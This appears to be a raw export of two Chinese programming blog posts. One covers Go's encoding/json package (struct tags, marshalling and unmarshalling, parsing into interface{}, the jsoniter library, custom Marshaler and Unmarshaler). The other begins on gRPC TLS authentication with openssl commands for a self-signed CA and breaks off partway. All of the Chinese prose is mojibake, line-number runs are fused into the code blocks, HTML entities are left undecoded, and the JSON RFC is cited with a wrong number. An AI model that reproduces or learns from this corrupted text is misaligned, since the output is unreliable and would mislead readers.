GoËØ≠Ë®ÄÊòØ‰∏™Âº∫Á±ªÂûãËØ≠Ë®ÄÔºåÂØπÊ†ºÂºèË¶ÅÊ±ÇÊûÅÂÖ∂‰∏•Ê†ºËÄåJSONÊ†ºÂºèËôΩÁÑ∂‰πüÊúâÁ±ªÂûãÔºå‰ΩÜÊòØÂπ∂‰∏çÁ®≥ÂÆöÔºåGoËØ≠Ë®ÄÂú®Ëß£ÊûêÊù•Ê∫ê‰∏∫ÈùûÂº∫Á±ªÂûãËØ≠Ë®ÄÊó∂ÊØîÂ¶ÇPHP,PythonÁ≠âÂ∫èÂàóÂåñÁöÑJSONÊó∂ÔºåÁªèÂ∏∏ÈÅáÂà∞‰∏Ä‰∫õÈóÆÈ¢òËØ∏Â¶ÇÂ≠óÊÆµÁ±ªÂûãÂèòÂåñÂØºËá¥Êó†Ê≥ïÊ≠£Â∏∏Ëß£ÊûêÁöÑÊÉÖÂÜµÔºåÂØºËá¥ÊúçÂä°‰∏çÁ®≥ÂÆö„ÄÇÊâÄ‰ª•Âú®ÂÅöJSONÁõ∏ÂÖ≥Ëß£Á†ÅÂíåÁºñÁ†ÅÁöÑËøáÁ®ã‰∏≠, ÈúÄË¶ÅÊ≥®ÊÑè‰ª•‰∏ã‰∫ãÈ°π: GoËØ≠Ë®Ä‰∏≠‰∏Ä‰∫õÁâπÊÆäÁöÑÁ±ªÂûãÔºåÊØîÂ¶ÇChannel„ÄÅcomplex„ÄÅfunctionÊòØ‰∏çËÉΩË¢´Ëß£ÊûêÊàêJSONÁöÑ. JSONÂØπË±°Âè™ÊîØÊåÅstring‰Ωú‰∏∫keyÔºåÊâÄ‰ª•Ë¶ÅÁºñÁ†Å‰∏Ä‰∏™mapÔºåÈÇ£‰πàÂøÖÈ°ªÊòØmap[string]TËøôÁßçÁ±ªÂûã(TÊòØGoËØ≠Ë®Ä‰∏≠‰ªªÊÑèÁöÑÁ±ªÂûã) ÂµåÂ•óÁöÑÊï∞ÊçÆÊòØ‰∏çËÉΩÁºñÁ†ÅÁöÑÔºå‰∏çÁÑ∂‰ºöËÆ©JSONÁºñÁ†ÅËøõÂÖ•Ê≠ªÂæ™ÁéØ ÊåáÈíàÂú®ÁºñÁ†ÅÁöÑÊó∂ÂÄô‰ºöËæìÂá∫ÊåáÈíàÊåáÂêëÁöÑÂÜÖÂÆπÔºåËÄåÁ©∫ÊåáÈíà‰ºöËæìÂá∫null Ê†áÂáÜÂ∫ìËß£ËØªÂú®‰ΩøÁî®Ê†áÂáÜÂ∫ìËøõË°åjsonÊìç‰Ωú‰πãÂâç, ÂÖàÁÆÄÂçï‰∫ÜËß£‰∏ãÊ†áÂáÜÂ∫ìÊèê‰æõ‰∫ÜÈÇ£‰∫õÂØπJSONÁöÑÊìç‰Ωú, ‰ª•‰∏ãËß£ËØª‰∏ªË¶ÅÊù•Ê∫ê‰∫éGoDoc ÂáΩÊï∞ Compact: Áî®‰∫éJSONÂ≠óÁ¨¶‰∏≤ÁöÑÊãºÊé•, ÊãºÊé•Êó∂‰ºöÊ†°È™åÂêéÈù¢ÁöÑÂ≠óÁ¨¶‰∏≤ÊòØÂê¶ÊòØÂêàÊ≥ïjson, Â¶ÇÊûú‰∏çÊòØ‰ºöÊä•Èîô, ‰ΩÜÂØπÂ≠óÁ¨¶‰∏≤‰∏≠ÁöÑÁâπÊÆäÂ≠óÁ¨¶(html‰∏çÂÆâÂÖ®Â≠óÁ¨¶,ÊØîÂ¶Ç‰∏äÈù¢ÊèêÂà∞ÁöÑ‚Äù&lt;‚Äù ‚Äú&gt;‚ÄùÁ≠â)‰∏çËøõË°åËΩ¨‰πâ. HTMLEscape: ÂíåCompactÁõ∏ÂØπ, ÊãºÊé•JSONÂ≠óÁ¨¶‰∏≤Êó∂‰ºöËøõË°åÁâπÊÆäÂ≠óÁ¨¶ËΩ¨‰πâ, ËΩ¨‰πâÊàêwebÂÆâÂÖ®ÁöÑÂ≠óÁ¨¶. Valid: Ê†°È™åÊï∞ÊçÆÊòØÂê¶ÊòØÂêàÊ≥ïÁöÑJSONÁºñÁ†ÅÊï∞ÊçÆ, ÂæÄÂæÄÁî®‰∫éÊï∞ÊçÆÊ†ºÂºèÊ†°È™å. Marshal: Áî®‰∫éÁºñÁ†ÅJSON. Indent: Áî®‰∫éJSONÁöÑÊ†ºÂºèÂåñËæìÂá∫, ÊúÄÂ∏∏ËßÅÁöÑÁî®Ê≥ïÊòØÂÆö‰πâJSONÁöÑÁº©Ëøõ,ÊØîÂ¶Ç2‰∏™Á©∫Ê†ºÁöÑÁº©Ëøõ. MarshalIndent: ÁºñÁ†ÅJSONÂêé,Â∏¶Ê†ºÂºèÂåñÁöÑËæìÂá∫. Unmarshal: Áî®‰∫éËß£Á†ÅJSON. Êé•Âè£ Unmarshaler: Áî®‰∫éËá™ÂÆö‰πâËß£Á†ÅjsonÊñπÊ≥ï Marshaler: Áî®‰∫éËá™ÂÆö‰πâÁºñÁ†ÅjsonÁöÑÊñπÊ≥ï ÁªìÊûÑ‰Ωì Decoder: ‰ªé‰∏Ä‰∏™ËæìÂÖ•ÊµÅËØªÂèñÊï∞ÊçÆÂπ∂‰∏îËß£Êûêjson Encoder: Êää‰∏Ä‰∏™ÁºñÁ†ÅÂêéÁöÑjsonÂÄºÂÜôÂá∫Áªô‰∏Ä‰∏™ËæìÂá∫ÊµÅ Number: JSONÈáåÈù¢ÁöÑnumberÁ±ªÂûã RawMessage: ÊòØ‰∏ÄÁßçÂ∑≤ÁªèË¢´ÁºñÁ†ÅÁöÑjsonÂ≠óÁ¨¶‰∏≤, ÂÆÉÂÆûÁé∞‰∫ÜMarshalerÂíåUnmarshaler, ÂèØ‰ª•Áî®Êù•Âª∂ËøüËß£ÊûêÈÉ®ÂàÜjson Token: ‰∏Ä‰∏™Á©∫interface, ÊåÅÊúâ‰∏ÄÁßçJsonÊò†Â∞ÑÁöÑGoÂÜÖÈÉ®Êï∞ÊçÆÁªìÊûÑÁöÑÂÄº 123456Delim, for the four JSON delimiters [ ] &#123; &#125;bool, for JSON booleansfloat64, for JSON numbersNumber, for JSON numbersstring, for JSON string literalsnil, for JSON null ÂºÇÂ∏∏ InvalidUTF8Error: Áî®‰∫éÂÖºÂÆπgolang1.2ÁâàÊú¨‰πãÂâç, 1.2ËøáÂêé‰∏ç‰ºöÊúâËØ•ÂºÇÂ∏∏ InvalidUnmarshalError: Ë°®Á§∫Ëß£Á†ÅjsonÊó∂‰º†ÈÄí‰∫Ü‰∏Ä‰∏™ÈùûÊ≥ïÁöÑÂèÇÊï∞, ÊØîÂ¶Ç‰∏Ä‰∏™Á©∫ÊåáÈíà MarshalerError: MarshalerÂºÇÂ∏∏ SyntaxError: jsonÁöÑËØ≠Ê≥ïÈîôËØØ UnmarshalFieldError: ÈôçÁ∫ß, Êú™‰ΩøÁî®, ‰∏∫‰∫ÜÂÖºÂÆπ‰øùÁïô UnmarshalTypeError: Ëß£Á†ÅÊó∂ ÈÅáÂà∞‰∏çËÆ§ËØÜÁöÑjsonÁ±ªÂûã, Ë°®Êòé‰º†ÂÖ•ÁöÑjsonÁöÑÁ±ªÂûãÊó†Ê≥ïË¢´ËΩ¨Êç¢ÊàêGolangÂØπÂ∫îÁöÑÁ±ªÂûã, ÊØîÂ¶ÇJSON RFCÂ¢ûÂä†Êñ∞ÁöÑJSONÁ±ªÂûã Â∞±‰ºöÈÅáÂà∞ËøôÊ†∑ÁöÑÈîôËØØ UnsupportedTypeError: ÁºñÁ†ÅÊó∂ ÈÅáÂà∞‰∏çËÆ§ËØÜÁöÑGolangÁ±ªÂûã, ‰∏çÁü•ÈÅìËØ•GolangÁöÑÊï∞ÊçÆÁ±ªÂûãÂ∫îËØ•Ë¢´Êò†Â∞ÑÊàêÈÇ£ÁßçjsonÁ±ªÂûã, ÊØîÂ¶ÇËá™ÂÆö‰πâÁöÑÁ±ªÂûã(Êú™ÂÆûÁé∞ marshalerÊé•Âè£) UnsupportedValueError: Âêå‰∏ä, ÈÅáÂà∞‰∏çËÆ§ËØÜÁöÑjsonÁ±ªÂûã, ÊØîÂ¶Ç ‰Ω†ÈúÄË¶ÅÂ∞ÜgolangÈáåÈù¢ÁöÑ‚Äùa‚ÄùÁºñÁ®ãÊàêjsonÈáåÈù¢‰∏çÂ≠òÂú®ÁöÑÁ±ªÂûã Struct TagÂú®JSONÁöÑËß£ÊûêËøáÁ®ã‰∏≠Struct TagË¢´È¢ëÁπÅ‰ΩøÁî®, Âõ†Ê≠§Âú®ËøõË°åÁúüÊ≠£ÁöÑËß£Êûê‰πãÂâç, ‰ªãÁªç‰∏ãGolang‰∏≠ÁöÑStruct Tag,Âú®golang‰∏≠, ÂëΩÂêçÈÉΩÊòØÊé®ËçêÈÉΩÊòØÁî®È©ºÂ≥∞ÊñπÂºè, Âπ∂‰∏îÂú®È¶ñÂ≠óÊØçÂ§ßÂ∞èÂÜôÊúâÁâπÊÆäÁöÑËØ≠Ê≥ïÂê´‰πâ(Â§ßÂÜôÂèòÈáèÂèØ‰ª•ÂØºÂá∫ÂåÖ, Â∞èÂÜôÂèòÈáèÂåÖÁßÅÊúâ)„ÄÇ‰ΩÜÊòØÁî±‰∫éÁªèÂ∏∏ÈúÄË¶ÅÂíåÂÖ∂ÂÆÉÁöÑÁ≥ªÁªüËøõË°åÊï∞ÊçÆ‰∫§‰∫í, ‰æãÂ¶ÇËΩ¨ÊàêjsonÊ†ºÂºè, Â≠òÂÇ®Âà∞mongodbÂïäÁ≠âÁ≠â„ÄÇËøô‰∏™Êó∂ÂÄôÂ¶ÇÊûúÁî®Â±ûÊÄßÂêçÊù•‰Ωú‰∏∫ÈîÆÂÄºÂèØËÉΩ‰∏ç‰∏ÄÂÆö‰ºöÁ¨¶ÂêàÈ°πÁõÆË¶ÅÊ±Ç, ÊØîÂ¶Ç‰∏çÊòØÁî®Struct TagÊó∂, JSONËß£ÊûêÂá∫Êù•ÁöÑÁªìÊûúÊòØËøôÊ†∑ÁöÑ: 123456789101112131415161718package mainimport ( "encoding/json" "fmt")// User is test for jsontype User struct &#123; ID string Name string&#125;func main() &#123; u := User&#123;ID: "user001", Name: "tom"&#125; jsonU, _ := json.Marshal(u) fmt.Println(string(jsonU))&#125; ËæìÂá∫ÂÜÖÂÆπÂ¶Ç‰∏ã:1&#123;"ID":"user001","Name":"tom"&#125; ÊòæÁÑ∂Â¶ÇÊûúËøôÊ†∑Ëß£ÊûêJSON‰ºöÂ§™Ê≠ªÊùø, Êó†Ê≥ïÈù¢ÂØπÁÅµÊ¥ªÁöÑ‰∏öÂä°, ËÄåÂÖ∑‰ΩìÂ¶Ç‰ΩïËΩ¨Êç¢Â∫îËØ•‰∫§ÁªôÊàë‰ª¨Ëá™Â∑±ÊéßÂà∂, ËÄåStruct TagÂ∞±ÊòØÁî®Êù•Âπ≤Ëøô‰∏™‰∫ãÂÑøÁöÑ„ÄÇStruct TagÈááÁî® Ë∑üÈöèÂú®Struct FieldÂêéÈù¢„ÄÇ12345678910111213141516171819202122232425ÈÇ£`Struct Tag`ÁöÑÂ∑•‰ΩúÂéüÁêÜÊòØÂíãÊ†∑ÁöÑ? ÈúÄË¶ÅÁî®Âà∞Tag‰∏≠ÁöÑÂÜÖÂÆπÊó∂, ÂíãÊ†∑ÂéªËé∑ÂèñÂñÉ? ÂÖ∂ÂÆûÊòØ‰ΩøÁî®ÂèçÂ∞Ñ(reflect)‰∏≠ÁöÑÊñπÊ≥ïÊù•Ëé∑ÂèñÁöÑ:```golangpackage mainimport ( &quot;fmt&quot; &quot;reflect&quot;)// User is test for jsontype User struct &#123; ID string `json:&quot;json_id&quot; bson:&quot;bson_id&quot; custom:&quot;my_id&quot;` Name string `json:&quot;json_name&quot; bson:&quot;bson_name&quot; custom:&quot;my_name&quot;`&#125;func main() &#123; u := &amp;User&#123;ID: &quot;user001&quot;, Name: &quot;tom&quot;&#125; t := reflect.TypeOf(u) // Ëé∑ÂèñÁ¨¨‰∏Ä‰∏™Â≠óÊÆµÁöÑStruct TagÁöÑÂÄº f0 := t.Elem().Field(0) fmt.Println(f0.Tag.Get(&quot;json&quot;)) fmt.Println(f0.Tag.Get(&quot;bson&quot;)) fmt.Println(f0.Tag.Get(&quot;custom&quot;))&#125; ËæìÂá∫ÁªìÊûúÂ¶Ç‰∏ã:123json_idbson_idmy_id Ëß£ÊûêJSONÈÄöËøáÊ†áÂáÜÂ∫ìÊèê‰æõÁöÑUnmarshalÂáΩÊï∞Êù•Ëß£ÊûêJSON, ‰ΩÜÊòØÊ†áÂáÜÂ∫ìÂú®Ëß£ÊûêÊú™Áü•Ê†ºÂºèÁöÑJSONÊó∂ÊØîËæÉÈ∫ªÁÉ¶, ÈúÄË¶ÅËß£ÊûêÂà∞interface{},ÁÑ∂ÂêéÊñ≠Ë®Ä, Âõ†Ê≠§Â¶ÇÊûúÊÉ≥Ë¶ÅÁÅµÊ¥ªÁöÑËß£ÊûêJSONÂèØ‰ª•‰ΩøÁî®‰∏Ä‰∫õÁ¨¨‰∏âÊñπÂ∫ì,ÊØîÂ¶Çjsonitor Ëß£ÊûêÂ∑≤Áü•JSON‰πãÂâç‰ªãÁªç‰∫ÜGolang‰∏≠ÁöÑStruct Tag, ËÄåÊ†áÂáÜÂ∫ìencoding/jsonÂ∞±ÊòØÂà©Áî®Stuct TagÂèØ‰ª•ËΩªÊùæÂÆûÁé∞JSONÁºñËß£Á†ÅËøáÁ®ã‰∏≠ÁöÑ‰∏Ä‰∫õËá™ÂÆö‰πâËΩ¨Êç¢, ËÄåÂÖ≥‰∫éJSON Struct TagÂÖ∑‰ΩìÁöÑÂÄº, Ê†áÂáÜÂ∫ìÊñáÊ°£ÈáåÈù¢ÊúâÁõ∏Â∫îÁöÑÊèèËø∞, ËøôÈáå‰ΩúÁÆÄÂçïÁöÑÊ¶ÇËø∞: Json Struct Tag Ê†ºÂºè‰∏∫json: &quot;filed_name,argument&quot; filed_name ‰∏∫Áî®Êà∑Ëá™ÂÆö‰πâÁöÑÈúÄË¶ÅËΩ¨Êç¢ÁöÑÂ≠óÊÆµÂêç, Â¶ÇÊûú‰∏∫‚Äù-‚ÄúË°®Á§∫ ËΩ¨Êç¢Êó∂Áõ¥Êé•ÂøΩÁï•Â≠óÊÆµ argument Ë°®Á§∫ËØ•Â≠óÊÆµËΩ¨Êç¢Êó∂ÁöÑ‰∏Ä‰∫õÈ¢ùÂ§ñÁöÑÂèÇÊï∞ omitempty Ë°®Á§∫Â¶ÇÊûú‰∏∫Á©∫ÁΩÆÂàôÂøΩÁï•Â≠óÊÆµ jsonÊï∞ÊçÆÁ±ªÂûã, ÊØîÂ¶Çstring, numbers, Ë°®Á§∫Âú®ËΩ¨Êç¢Êó∂, Ë∞ÉÊï¥ÊàêÂØπÂ∫îÁöÑÊï∞ÊçÆÁ±ªÂûã 12345678910111213141516171819202122232425package mainimport ( "encoding/json" "fmt")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;func main() &#123; str := `&#123;"name":"test","product_id":"1","number":"110011","price":"0.01","is_on_sale":"true"&#125;` p := Product&#123;&#125; json.Unmarshal([]byte(str), &amp;p) fmt.Println(p)&#125; ËæìÂá∫ÁªìÊûú:1&#123;test 1 110011 0.01 true &#125; Ëß£ÊûêÊú™Áü•JSON‰∏äÈù¢ÈÇ£ÁßçËß£ÊûêÊñπÂºèÊòØÂú®Êàë‰ª¨Áü•ÊôìË¢´Ëß£ÊûêÁöÑJSONÊï∞ÊçÆÁöÑÁªìÊûÑÁöÑÂâçÊèê‰∏ãÈááÂèñÁöÑÊñπÊ°à, Â¶ÇÊûúÊàë‰ª¨‰∏çÁü•ÈÅìË¢´Ëß£ÊûêÁöÑÊï∞ÊçÆÁöÑÊ†ºÂºè, ÂèàÂ∫îËØ•Â¶Ç‰ΩïÊù•Ëß£ÊûêÂë¢?Êàë‰ª¨Áü•ÈÅìinterface{}ÂèØ‰ª•Áî®Êù•Â≠òÂÇ®‰ªªÊÑèÊï∞ÊçÆÁ±ªÂûãÁöÑÂØπË±°ÔºåËøôÁßçÊï∞ÊçÆÁªìÊûÑÊ≠£Â•ΩÁî®‰∫éÂ≠òÂÇ®Ëß£ÊûêÁöÑÊú™Áü•ÁªìÊûÑÁöÑjsonÊï∞ÊçÆÁöÑÁªìÊûú„ÄÇJSONÂåÖ‰∏≠ÈááÁî®map[string]interface{}Âíå[]interface{}ÁªìÊûÑÊù•Â≠òÂÇ®‰ªªÊÑèÁöÑJSONÂØπË±°ÂíåÊï∞ÁªÑ„ÄÇ Ëß£ÊûêÂà∞interface{}1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( "encoding/json" "fmt")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;func main() &#123; // ÂÅáËÆæÊàë‰ª¨Âπ∂‰∏çÁü•ÈÅìËøô‰∏™JSONÁöÑÊ†ºÂºè, Êàë‰ª¨ÂèØ‰ª•Â∞Ü‰ªñËß£ÊûêÂà∞interface&#123;&#125; str := `&#123;"name":"test","product_id":"1","number":"110011","price":"0.01","is_on_sale":"true"&#125;` var p interface&#123;&#125; json.Unmarshal([]byte(str), &amp;p) // Áé∞Âú®Êàë‰ª¨ÈúÄË¶Å‰ªéËøô‰∏™interface&#123;&#125;Ëß£ÊûêÂá∫ÈáåÈù¢ÁöÑÊï∞ÊçÆ m := p.(map[string]interface&#123;&#125;) for k, v := range m &#123; switch vv := v.(type) &#123; case string: fmt.Printf("%s is string, value: %s\n", k, vv) case int: fmt.Printf("%s is int, value: %d\n", k, vv) case int64: fmt.Printf("%s is int64, value: %d\n", k, vv) case bool: fmt.Printf("%s is bool, vaule: %v", k, vv) default: fmt.Printf("%s is unknow type\n", k) &#125; &#125;&#125; ËæìÂá∫ÁªìÊûú:12345name is string, value: testproduct_id is string, value: 1number is string, value: 110011price is string, value: 0.01is_on_sale is string, value: true ‰ΩøÁî®Á¨¨‰∏âÊñπÂ∫ìjsonitorËøõË°åËß£ÊûêÂ§ßÈáèÁöÑÁ±ªÂûãÊñ≠Ë®ÄÊòØ‰∏çÊòØËÆ©‰Ω†ËßâÂæóÂæàÁÉ¶, Â¶ÇÊûúÊòØÂ§öÂ±Çinterface{}ÂµåÂ•óÈÇ£‰πàÊñ≠Ë®ÄÈúÄË¶ÅÊõ¥Â§ö, Âõ†Ê≠§Â∞±ÊúâÂæàÂ§öÁ¨¨‰∏âÊñπJSONËß£ÊûêÂ∫ìÂá∫Áé∞, ‰ªñ‰ª¨Â∞ΩÈáèÈááÁî®ÊµÅÂºèËø≠‰ª£Ëß£Êûê, ËøôÈáåÊàëÁî®ËøáÁöÑÊØîËæÉ‰∏çÈîôÁöÑÊòØÈô∂ÊñáÁöÑjsonitor:1234567891011121314151617181920212223package mainimport ( "fmt" "github.com/json-iterator/go")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;func main() &#123; str := `&#123;"name":"test","product_id":"1","number":"110011","price":"0.01","is_on_sale":"true"&#125;` fmt.Println(jsoniter.Get([]byte(str), "price").ToFloat64())&#125; Ëá™ÂÆö‰πâËß£ÊûêstructÂÆûÁé∞UnmarshalerÊé•Âè£, ‰æøÂèØ‰ª•ÂÆûÁé∞Ëß£ÊûêJSONÁöÑËøáÁ®ã,1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( "encoding/json" "fmt")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;// UnmarshalJSON Ëá™ÂÆö‰πâËß£Êûêfunc (p *Product) UnmarshalJSON(data []byte) error &#123; // Á§∫‰æã‰ª£Á†Å‰ΩøÁî®jsonitor‰ª£‰∏∫Ëß£Êûê p.Price = 0.01 p.Number = 1100 p.Name = "my_test_name" return nil&#125;// MarshalJSON Ëá™ÂÆö‰πâÁºñÁ†Åfunc (p *Product) MarshalJSON() ([]byte, error) &#123; // Ëá™Â∑±ÁºñÁ†Åjson return []byte(`&#123;"test":"name_test"&#125;`), nil&#125;func main() &#123; str := `&#123;"name":"test","product_id":"1","number":"110011","price":"0.01","is_on_sale":"true"&#125;` p := Product&#123;&#125; json.Unmarshal([]byte(str), &amp;p) fmt.Println(p)&#125; ÁîüÊàêJSONÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÊ†áÂáÜÂ∫ìjsonÂ∞ÜStrucÂ∫èÂàóÂåñÊàêJSON‰πüÂèØ‰ª•Ëá™ÂÆö‰πâÂ∫èÂàóÂåñÁöÑÊñπÊ≥ï ÈÄöËøástructÁîüÊàêJSON‰∏äÈù¢Âú®‰ªãÁªçJSONËß£ÊûêÁöÑÊó∂ÂÄôÂ∑≤Áªè‰ªãÁªç‰∫ÜÂÖ≥‰∫éJSONÁöÑStruct Tag‰∫Ü, Âõ†Ê≠§Áõ¥Êé•ÂèÇËÄÉ‰ª£Á†Å:12345678910111213141516171819202122232425262728293031package mainimport ( "encoding/json" "fmt")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;func main() &#123; p := &amp;Product&#123; Name: "test", ProductID: 01, Number: 110011, Price: 0.01, IsOnSale: true, Test: "test", &#125; jsonP, _ := json.Marshal(p) fmt.Println(string(jsonP))&#125; ËæìÂá∫ÁªìÊûúÂ¶Ç‰∏ã:1&#123;"name":"test","product_id":"1","number":"110011","price":"0.01","is_on_sale":"true"&#125; Ëá™ÂÆö‰πâÁîüÊàêStructÂÆûÁé∞MarshalerÊé•Âè£, ‰æøÂèØ‰ª•Ëá™ÂÆö‰πâÁºñÁ†ÅËøáÁ®ã1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport ( "encoding/json" "fmt")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;// UnmarshalJSON Ëá™ÂÆö‰πâËß£Êûêfunc (p *Product) UnmarshalJSON(data []byte) error &#123; // Á§∫‰æã‰ª£Á†Å‰ΩøÁî®jsonitor‰ª£‰∏∫Ëß£Êûê p.Price = 0.01 p.Number = 1100 p.Name = "my_test_name" return nil&#125;// MarshalJSON Ëá™ÂÆö‰πâÁºñÁ†Åfunc (p *Product) MarshalJSON() ([]byte, error) &#123; // Ëá™Â∑±ÁºñÁ†Åjson return []byte(`&#123;"test":"name_test"&#125;`), nil&#125;func main() &#123; p := &amp;Product&#123; Name: "test", ProductID: 01, Number: 110011, Price: 0.01, IsOnSale: true, Test: "test", &#125; jsonP, _ := json.Marshal(p) fmt.Println(string(jsonP))&#125; ÂèÇËÄÉ JSONÂÆòÊñπ‰ªãÁªç JSON RFC4672 encoding/json godoc Go Blog: JSON and Go Golang‰∏≠‰ΩøÁî®JSONÁöÑ‰∏Ä‰∫õÂ∞èÊäÄÂ∑ß]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gRPCÂü∫‰∫éÊã¶Êà™Âô®Ê®°ÂºèÁöÑËÆ§ËØÅ]]></title>
    <url>%2F2017%2F08%2F07%2Fgrpc-auth%2F</url>
    <content type="text"><![CDATA[gRPCÁöÑÊúçÂä°Á´ØÈúÄË¶Å‰∏éËÆ§ËØÅÂπ≥Âè∞ÂØπÊé•, ‰πãÂâç‰ΩøÁî®httpÊó∂ÈÄöËøá‰∏≠Èó¥‰ª∂ÁöÑÂΩ¢ÂºèËøõË°åÂÆûÁé∞, Âõ†Ê≠§ËøôÁØáÊñáÁ´†‰∏ªË¶ÅÈ™åËØÅgRPC‰∏≠ËÉΩÂê¶‰ª•‰∏≠Èó¥‰ª∂ÁöÑÂΩ¢ÂºèÂÆûÁé∞gRPCÁöÑËÆ§ËØÅ„ÄÇ ËÆ§ËØÅÊñπÂºègRPC ÈªòËÆ§Êèê‰æõ‰∫Ü‰∏§ÁßçËÆ§ËØÅÊñπÂºèÔºö Âü∫‰∫éSSL/TLSËÆ§ËØÅÊñπÂºè ËøúÁ®ãË∞ÉÁî®ËÆ§ËØÅÊñπÂºè‰∏∫‰∫Ü‰øùËØÅAPI Gateway‰∏éÂêéÁ´ØgRPCÊúçÂä°ÈÄö‰ø°ÁöÑÂÆâÂÖ®ÂêåÊó∂‰øùËØÅtokenÂÆâÂÖ®, ‰ª•‰∏ä2ÁßçÊñπÂºèÂêåÊó∂‰ΩøÁî®„ÄÇ ‰ª£Á†ÅÁ§∫‰æãÊàëÈúÄË¶ÅÈ™åËØÅÁöÑÊµÅÁ®ãÂ§ßËá¥Â¶Ç‰∏ã(‰∏éOpenstackÁöÑËÆ§ËØÅÊµÅÁ®ã‰∏ÄÊ†∑):ÂÆåÊï¥ÁöÑ‰ª£ÁêÜÁ§∫‰æã: grpc‰∏≠Èó¥‰ª∂ËÆ§ËØÅ Âú®ËøõË°åcodingÂâç, Êàë‰ª¨ÈúÄË¶Å‰∏∫ÊúçÂä°Á´ØÁîüÊàêTLSÈúÄË¶ÅÁöÑËØÅ‰π¶: Ëá™Âª∫CA 12345678910111213141516# ÁîüÊàêCAËá™Â∑±ÁöÑÁßÅÈí•$(umask 077; openssl genrsa -out private/cakey.pem 2048)# Ëá™Á≠æ10Âπ¥$openssl req -new -x509 -key private/cakey.pem -out cacert.pemCountry Name (2 letter code) [AU]:CNState or Province Name (full name) [Some-State]:SiChuanLocality Name (eg, city) []:ChengDuOrganization Name (eg, company) [Internet Widgits Pty Ltd]:defineIOT LtdOrganizational Unit Name (eg, section) []:TecCommon Name (e.g. server FQDN or YOUR name) []:caEmail Address []:yumaojun03@gmail.com# ÂàùÂßãÂåñËá™Âª∫CAÁöÑ‰∏ÄÈÉ®ÂàÜÊñá‰ª∂$mkdir certs newcerts crl$touch index.txt$touch serial$echo 01 &gt; serial Á≠æÂèëÊúçÂä°Á´ØËØÅ‰π¶ 1234567891011121314151617181920212223242526272829303132# ÁîüÊàêserverËá™Â∑±ÁöÑÁßÅÈí•$openssl genrsa -out server1.key 2048# ÁîüÊàêËØÅ‰π¶Á≠æËØÅËØ∑Ê±Ç$openssl req -new -key server1.key -out server1.csrCountry Name (2 letter code) [AU]:CNState or Province Name (full name) [Some-State]:ChengduLocality Name (eg, city) []:ChengduOrganization Name (eg, company) [Internet Widgits Pty Ltd]:defineIOT LtdOrganizational Unit Name (eg, section) []:TecCommon Name (e.g. server FQDN or YOUR name) []:server1Email Address []:yumaojun03@gmail.comPlease enter the following 'extra' attributesto be sent with your certificate requestA challenge password []:An optional company name []:# Âõ†‰∏∫ÊàëCAÂ∞±Âú®Êú¨ÊúçÂä°Âô®‰∏ä,Áõ¥Êé•Á≠æÂèëËØÅ‰π¶$openssl ca -in GoWorkDir/src/golang/grpc-auth/keys/server1.csr -out server1.pem -days 3650Using configuration from /System/Library/OpenSSL/openssl.cnfCheck that the request matches the signatureSignature okThe stateOrProvinceName field needed to be the same in theCA certificate (SiChuan) and the request (Chengdu)# Â∞ÜÁ≠æÂ•ΩÁöÑËØÅ‰π¶‰∫§Áªôserver$mv server1.pem GoWorkDir/src/golang/grpc-auth/keys# serverÁ´ØÁöÑËØÅ‰π¶ÂáÜÂ§áÂÆåÊàê$ll GoWorkDir/src/golang/grpc-auth/keystotal 40-rw-r--r-- 1 maojun staff 1.6K 8 8 09:15 cacert.pem-rw-r--r-- 1 maojun staff 1.0K 8 8 09:27 server1.csr-rw-r--r-- 1 maojun staff 1.6K 8 7 21:21 server1.key-rw-r--r-- 1 maojun staff 4.5K 8 8 09:28 server1.pem ÁõÆÂΩïÁªìÊûÑÁîüÊàêÂ•ëÁ∫¶Êñá‰ª∂1$protoc --go_out=plugins=grpc:. hello.proto ÁõÆÂΩïÁªìÊûÑÂ¶Ç‰∏ã:1234567891011121314$tree ..‚îú‚îÄ‚îÄ client‚îÇ ‚îî‚îÄ‚îÄ main.go‚îú‚îÄ‚îÄ keys‚îÇ ‚îú‚îÄ‚îÄ cacert.pem‚îÇ ‚îú‚îÄ‚îÄ server1.csr‚îÇ ‚îú‚îÄ‚îÄ server1.key‚îÇ ‚îî‚îÄ‚îÄ server1.pem‚îú‚îÄ‚îÄ proto‚îÇ ‚îú‚îÄ‚îÄ hello.pb.go‚îÇ ‚îî‚îÄ‚îÄ hello.proto‚îî‚îÄ‚îÄ server ‚îî‚îÄ‚îÄ main.go tlsÂÖàÁúãcredentials.go‰∏≠ÂÖ≥‰∫éÈÄöËøáTLSÂàõÂª∫ÂÆ¢Êà∑Á´ØÂíåÊúçÂä°Á´ØÁõ∏ÂÖ≥ÂáΩÊï∞12345678910111213141516171819202122// NewClientTLSFromFile ‰º†ÂÖ•ÂÆ¢Êà∑Á´ØÂª∫Á´ãTLSËøûÊé•Êó∂ÈúÄË¶ÅÁöÑËØÅ‰π¶, 